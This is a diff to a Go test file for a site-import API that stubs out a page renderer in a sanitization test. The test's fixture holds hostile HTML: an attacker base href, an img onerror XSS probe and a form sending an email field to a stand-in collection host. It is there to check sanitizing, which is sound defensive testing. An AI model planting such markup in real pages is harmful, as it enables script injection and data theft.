@@ -1,10 +1,12 @@
 package api
 
 import (
+	"context"
 	"encoding/json"
 	"fmt"
 	"net/http"
 	"net/http/httptest"
+	"net/url"
 	"strings"
 	"testing"
 	"time"
@@ -57,6 +59,11 @@ func setupTest(t *testing.T) *testContext {
 }
 
 func TestSiteImportSanitizesRemoteResources(t *testing.T) {
+	originalRenderer := renderImportPageForImport
+	renderImportPageForImport = func(context.Context, string) ([]byte, *url.URL, error) {
+		return nil, nil, errRenderedImportUnavailable
+	}
+	t.Cleanup(func() { renderImportPageForImport = originalRenderer })
 	ctx := setupTest(t)
 	h := `<html><head><base href="https://attacker.example.test/"></head><body><img src="/test.png" onerror="alert(1)"><form action="https://attacker.example.test/collect"><input name="email"></form></body></html>`
 	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
